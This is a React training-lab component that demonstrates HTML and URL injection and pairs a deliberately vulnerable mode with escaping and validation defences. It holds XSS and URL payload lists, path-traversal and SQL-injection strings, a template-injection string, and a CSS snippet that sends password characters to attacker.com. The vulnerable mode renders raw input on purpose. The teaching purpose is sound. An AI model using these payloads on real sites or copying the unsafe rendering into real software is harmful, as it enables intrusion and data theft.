'use client'

import { useState } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Alert, AlertDescription } from '@/components/ui/alert'
import { Code } from '@/components/ui/code'
import { FileText, Shield, AlertTriangle, Copy, Check, Link, Eye } from 'lucide-react'

export default function HTMLInjectionLab() {
  const [activeTab, setActiveTab] = useState('demo')
  const [inputMode, setInputMode] = useState<'vulnerable' | 'safe'>('vulnerable')
  const [userInput, setUserInput] = useState('')
  const [renderedContent, setRenderedContent] = useState('')
  const [urlInput, setUrlInput] = useState('')
  const [currentUrl, setCurrentUrl] = useState('/user/profile')
  const [copied, setCopied] = useState(false)

  const handleHTMLInjection = () => {
    if (inputMode === 'vulnerable') {
      // Vulnerable: Direct HTML injection
      setRenderedContent(userInput)
    } else {
      // Safe: Escape HTML
      const escaped = userInput
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;')
      setRenderedContent(escaped)
    }
  }

  const handleURLInjection = () => {
    if (inputMode === 'vulnerable') {
      // Vulnerable: Direct URL usage
      setCurrentUrl(urlInput)
    } else {
      // Safe: URL validation
      try {
        const url = new URL(urlInput, window.location.origin)
        if (url.origin === window.location.origin) {
          setCurrentUrl(url.pathname)
        } else {
          setCurrentUrl('/error/invalid-url')
        }
      } catch {
        setCurrentUrl('/error/invalid-url')
      }
    }
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const htmlPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert("XSS")>',
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert("XSS")>',
    '<input autofocus onfocus=alert(1)>',
    '<style>@keyframes x{};*:animation-name:x,onanimationstart:alert(1)</style>',
    '<details open ontoggle=alert(1)>'
  ]

  const urlPayloads = [
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    '/user/profile"><script>alert(1)</script>',
    '//evil.com/steal.js',
    '/redirect?url=https://evil.com',
    '/%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '/api/users?id=1 UNION SELECT * FROM passwords'
  ]

  const injectionScenarios = [
    {
      name: 'Comment Section',
      description: 'User comments on blog posts',
      vulnerable: 'Direct HTML rendering allows script injection',
      safe: 'HTML sanitization prevents malicious code'
    },
    {
      name: 'Profile Bio',
      description: 'User profile information',
      vulnerable: 'Unescaped HTML breaks page layout',
      safe: 'Text-only rendering with proper escaping'
    },
    {
      name: 'Search Results',
      description: 'Displaying search queries',
      vulnerable: 'URL parameters injected into HTML',
      safe: 'Output encoding and URL validation'
    },
    {
      name: 'Navigation Links',
      description: 'Dynamic menu items',
      vulnerable: 'JavaScript URLs execute malicious code',
      safe: 'URL allowlist and validation'
    }
  ]

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 p-6">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <div className="flex items-center space-x-3 mb-4">
            <div className="p-3 bg-purple-500 rounded-lg">
              <FileText className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-2xl sm:text-3xl font-bold text-slate-900">HTML/URL Injection Lab</h1>
              <p className="text-slate-600">Learn how HTML and URL injection attacks break layouts and compromise security</p>
            </div>
          </div>
          <Alert className="mb-6">
            <AlertTriangle className="h-4 w-4" />
            <AlertDescription>
              HTML injection can lead to XSS, layout breaking, and data theft. URL injection can redirect users and bypass security controls.
            </AlertDescription>
          </Alert>
        </div>

        <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
          <TabsList className="grid w-full grid-cols-2 sm:grid-cols-3 h-auto">
            <TabsTrigger value="demo" className="text-xs sm:text-sm">Interactive Demo</TabsTrigger>
            <TabsTrigger value="scenarios" className="text-xs sm:text-sm">Attack Scenarios</TabsTrigger>
            <TabsTrigger value="defenses" className="text-xs sm:text-sm">Defense Techniques</TabsTrigger>
          </TabsList>

          {/* Interactive Demo Tab */}
          <TabsContent value="demo" className="space-y-6">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* HTML Injection Demo */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <FileText className="w-5 h-5" />
                    <span>HTML Injection Demo</span>
                  </CardTitle>
                  <CardDescription>
                    Inject malicious HTML into user content
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  {/* Mode Selection */}
                  <div className="flex items-center space-x-4">
                    <label className="text-sm font-medium">Security Mode:</label>
                    <div className="flex space-x-2">
                      <Button
                        variant={inputMode === 'vulnerable' ? 'destructive' : 'outline'}
                        size="sm"
                        onClick={() => setInputMode('vulnerable')}
                      >
                        <Eye className="w-4 h-4 mr-1" />
                        Vulnerable
                      </Button>
                      <Button
                        variant={inputMode === 'safe' ? 'default' : 'outline'}
                        size="sm"
                        onClick={() => setInputMode('safe')}
                      >
                        <Shield className="w-4 h-4 mr-1" />
                        Safe
                      </Button>
                    </div>
                  </div>

                  {/* Input Section */}
                  <div className="space-y-2">
                    <label className="text-sm font-medium">User Content:</label>
                    <textarea
                      value={userInput}
                      onChange={(e) => setUserInput(e.target.value)}
                      placeholder="Enter your comment or bio..."
                      className="w-full p-3 border border-slate-300 rounded-lg font-mono text-sm"
                      rows={3}
                    />
                  </div>

                  {/* Quick Payloads */}
                  <div className="space-y-2">
                    <label className="text-sm font-medium">Quick Payloads:</label>
                    <div className="flex flex-wrap gap-1">
                      {htmlPayloads.map((payload, index) => (
                        <Button
                          key={index}
                          variant="outline"
                          size="sm"
                          onClick={() => setUserInput(payload)}
                          className="text-xs font-mono h-6"
                        >
                          {payload.length > 15 ? payload.substring(0, 15) + '...' : payload}
                        </Button>
                      ))}
                    </div>
                  </div>

                  <Button onClick={handleHTMLInjection} className="w-full">
                    {inputMode === 'vulnerable' ? '🚨 Inject HTML' : '🛡️ Render Safely'}
                  </Button>

                  {/* Rendered Output */}
                  {renderedContent && (
                    <div className="space-y-2">
                      <label className="text-sm font-medium">Rendered Output:</label>
                      <div 
                        className={`p-4 border rounded-lg ${
                          inputMode === 'vulnerable' ? 'border-red-300 bg-red-50' : 'border-green-300 bg-green-50'
                        }`}
                        dangerouslySetInnerHTML={{ __html: renderedContent }}
                      />
                      <Badge variant={inputMode === 'vulnerable' ? 'destructive' : 'default'}>
                        {inputMode === 'vulnerable' ? 'HTML Injection Possible' : 'HTML Escaped'}
                      </Badge>
                    </div>
                  )}
                </CardContent>
              </Card>

              {/* URL Injection Demo */}
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Link className="w-5 h-5" />
                    <span>URL Injection Demo</span>
                  </CardTitle>
                  <CardDescription>
                    Inject malicious URLs into navigation and redirects
                  </CardDescription>
                </CardHeader>
                <CardContent className="space-y-4">
                  {/* Current URL Display */}
                  <div className="p-3 bg-slate-100 rounded-lg border border-slate-300">
                    <div className="text-sm font-medium mb-1">Current URL:</div>
                    <code className="text-sm bg-white px-2 py-1 rounded">
                      {currentUrl}
                    </code>
                  </div>

                  {/* URL Input */}
                  <div className="space-y-2">
                    <label className="text-sm font-medium">Target URL:</label>
                    <input
                      type="text"
                      value={urlInput}
                      onChange={(e) => setUrlInput(e.target.value)}
                      placeholder="Enter URL to navigate to..."
                      className="w-full p-3 border border-slate-300 rounded-lg font-mono text-sm"
                    />
                  </div>

                  {/* Quick Payloads */}
                  <div className="space-y-2">
                    <label className="text-sm font-medium">Malicious URLs:</label>
                    <div className="flex flex-wrap gap-1">
                      {urlPayloads.map((payload, index) => (
                        <Button
                          key={index}
                          variant="outline"
                          size="sm"
                          onClick={() => setUrlInput(payload)}
                          className="text-xs font-mono h-6"
                        >
                          {payload.length > 20 ? payload.substring(0, 20) + '...' : payload}
                        </Button>
                      ))}
                    </div>
                  </div>

                  <Button onClick={handleURLInjection} className="w-full">
                    {inputMode === 'vulnerable' ? '🚨 Navigate to URL' : '🛡️ Validate URL'}
                  </Button>

                  {/* URL Analysis */}
                  {urlInput && (
                    <div className="space-y-2">
                      <h4 className="font-semibold text-sm">URL Analysis:</h4>
                      <div className="text-xs space-y-1">
                        {urlInput.startsWith('javascript:') && (
                          <Alert className="border-red-200 bg-red-50">
                            <AlertDescription className="text-red-800">
                              ⚠️ JavaScript URL detected - Can execute arbitrary code!
                            </AlertDescription>
                          </Alert>
                        )}
                        {urlInput.startsWith('data:') && (
                          <Alert className="border-red-200 bg-red-50">
                            <AlertDescription className="text-red-800">
                              ⚠️ Data URL detected - Can embed malicious content!
                            </AlertDescription>
                          </Alert>
                        )}
                        {urlInput.includes('<script>') && (
                          <Alert className="border-red-200 bg-red-50">
                            <AlertDescription className="text-red-800">
                              ⚠️ HTML injection in URL - Can break page structure!
                            </AlertDescription>
                          </Alert>
                        )}
                        {!urlInput.startsWith('javascript:') && !urlInput.startsWith('data:') && !urlInput.includes('<script>') && (
                          <Alert className="border-green-200 bg-green-50">
                            <AlertDescription className="text-green-800">
                              ✅ URL appears safe (basic validation passed)
                            </AlertDescription>
                          </Alert>
                        )}
                      </div>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>

            {/* Real-World Impact */}
            <Card>
              <CardHeader>
                <CardTitle>🌍 Real-World Impact of HTML/URL Injection</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto">
                      <AlertTriangle className="w-8 h-8 text-red-600" />
                    </div>
                    <h4 className="font-semibold">XSS Attacks</h4>
                    <p className="text-sm text-slate-700">
                      Script injection leads to data theft and session hijacking
                    </p>
                  </div>
                  
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto">
                      <FileText className="w-8 h-8 text-orange-600" />
                    </div>
                    <h4 className="font-semibold">Layout Breaking</h4>
                    <p className="text-sm text-slate-700">
                      Malformed HTML breaks page design and user experience
                    </p>
                  </div>
                  
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-purple-100 rounded-full flex items-center justify-center mx-auto">
                      <Link className="w-8 h-8 text-purple-600" />
                    </div>
                    <h4 className="font-semibold">Phishing Redirects</h4>
                    <p className="text-sm text-slate-700">
                      Malicious URLs redirect users to fake login pages
                    </p>
                  </div>
                  
                  <div className="text-center space-y-2">
                    <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
                      <Shield className="w-8 h-8 text-blue-600" />
                    </div>
                    <h4 className="font-semibold">Content Spoofing</h4>
                    <p className="text-sm text-slate-700">
                      Injected content replaces legitimate information
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Attack Scenarios Tab */}
          <TabsContent value="scenarios" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {injectionScenarios.map((scenario, index) => (
                <Card key={index}>
                  <CardHeader>
                    <CardTitle>{scenario.name}</CardTitle>
                    <CardDescription>{scenario.description}</CardDescription>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-3">
                      <div>
                        <h4 className="font-semibold text-sm mb-1">❌ Vulnerable Behavior:</h4>
                        <p className="text-sm text-slate-700">{scenario.vulnerable}</p>
                      </div>
                      <div>
                        <h4 className="font-semibold text-sm mb-1">✅ Safe Behavior:</h4>
                        <p className="text-sm text-slate-700">{scenario.safe}</p>
                      </div>
                      <div>
                        <h4 className="font-semibold text-sm mb-1">🔧 Example Code:</h4>
                        <Code className="block p-2 bg-slate-50 rounded text-xs">
{`// Vulnerable
element.innerHTML = userInput;

// Safe
element.textContent = userInput;
// or
element.innerHTML = DOMPurify.sanitize(userInput);`}
                        </Code>
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>

            {/* Advanced Attack Examples */}
            <Card>
              <CardHeader>
                <CardTitle>🔬 Advanced Injection Techniques</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-3">
                    <h4 className="font-semibold">CSS Injection</h4>
                    <Code className="block p-2 bg-slate-50 rounded text-xs">
{`<!-- Inject CSS to steal data -->
<style>
  input[type="password"][value$="a"] {
    background: url(https://attacker.com/steal?char=a);
  }
</style>`}
                    </Code>
                    <p className="text-sm text-slate-700">
                      Uses CSS selectors to extract sensitive information
                    </p>
                  </div>

                  <div className="space-y-3">
                    <h4 className="font-semibold">Template Injection</h4>
                    <Code className="block p-2 bg-slate-50 rounded text-xs">
{`<!-- Template engine injection -->
{{7*7}}  // Math: 49
{{config}}  // Leak configuration
{{''.constructor.constructor('alert(1)')()}}  // RCE`}
                    </Code>
                    <p className="text-sm text-slate-700">
                      Exploits template rendering engines for code execution
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>

          {/* Defense Techniques Tab */}
          <TabsContent value="defenses" className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Shield className="w-5 h-5" />
                    <span>Output Encoding</span>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  <Code className="block p-3 bg-green-50 border border-green-200 rounded text-sm">
{`// HTML Context
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// Attribute Context
function escapeAttribute(unsafe) {
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}`}
                  </Code>
                </CardContent>
              </Card>

              <Card>
                <CardHeader>
                  <CardTitle className="flex items-center space-x-2">
                    <Shield className="w-5 h-5" />
                    <span>URL Validation</span>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  <Code className="block p-3 bg-green-50 border border-green-200 rounded text-sm">
{`function validateUrl(url) {
  try {
    const parsed = new URL(url, window.location.origin);
    
    // Block dangerous protocols
    const blocked = ['javascript:', 'data:', 'vbscript:'];
    if (blocked.some(p => url.toLowerCase().startsWith(p))) {
      return false;
    }
    
    // Only allow same-origin or allowlisted domains
    const allowed = ['https://trusted-site.com'];
    return allowed.includes(parsed.origin) || 
           parsed.origin === window.location.origin;
  } catch {
    return false;
  }
}`}
                  </Code>
                </CardContent>
              </Card>
            </div>

            {/* Framework-Specific Defenses */}
            <Card>
              <CardHeader>
                <CardTitle>🛡️ Framework Protections</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <div className="space-y-3">
                    <h4 className="font-semibold">React</h4>
                    <Code className="block p-2 bg-blue-50 border border-blue-200 rounded text-xs">
{`// Auto-escaped by default
const userContent = '<script>alert(1)</script>';
return <div>{userContent}</div>; // Safe!

// Dangerous (use carefully)
return <div dangerouslySetInnerHTML={{__html: userContent}} />;`}
                    </Code>
                  </div>

                  <div className="space-y-3">
                    <h4 className="font-semibold">Vue.js</h4>
                    <Code className="block p-2 bg-green-50 border border-green-200 rounded text-xs">
{`<!-- Auto-escaped -->
<template>
  <div>{{ userInput }}</div> <!-- Safe -->
  <div v-html="trustedHtml"></div> <!-- Use carefully -->
</template>

<script>
export default {
  computed: {
    trustedHtml() {
      return DOMPurify.sanitize(this.userInput);
    }
  }
}
</script>`}
                    </Code>
                  </div>

                  <div className="space-y-3">
                    <h4 className="font-semibold">Angular</h4>
                    <Code className="block p-2 bg-red-50 border border-red-200 rounded text-xs">
{`// DomSanitizer for safe HTML
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

@Component({...})
export class SafeComponent {
  safeHtml: SafeHtml;
  
  constructor(private sanitizer: DomSanitizer) {}
  
  setContent(userInput: string) {
    this.safeHtml = this.sanitizer.bypassSecurityTrustHtml(
      DOMPurify.sanitize(userInput)
    );
  }
}`}
                    </Code>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Security Checklist */}
            <Card>
              <CardHeader>
                <CardTitle>✅ Security Checklist</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-2">
                    <h4 className="font-semibold">Input Validation</h4>
                    <ul className="text-sm space-y-1 text-slate-700">
                      <li>□ Validate all user input on server-side</li>
                      <li>□ Use allowlists for acceptable content</li>
                      <li>□ Reject suspicious patterns</li>
                      <li>□ Sanitize file uploads</li>
                      <li>□ Validate URL parameters</li>
                    </ul>
                  </div>
                  <div className="space-y-2">
                    <h4 className="font-semibold">Output Encoding</h4>
                    <ul className="text-sm space-y-1 text-slate-700">
                      <li>□ Context-aware encoding (HTML, JS, CSS)</li>
                      <li>□ Use framework auto-escaping</li>
                      <li>□ Implement Content Security Policy</li>
                      <li>□ Use templating engines safely</li>
                      <li>□ Avoid dynamic code evaluation</li>
                    </ul>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  )
}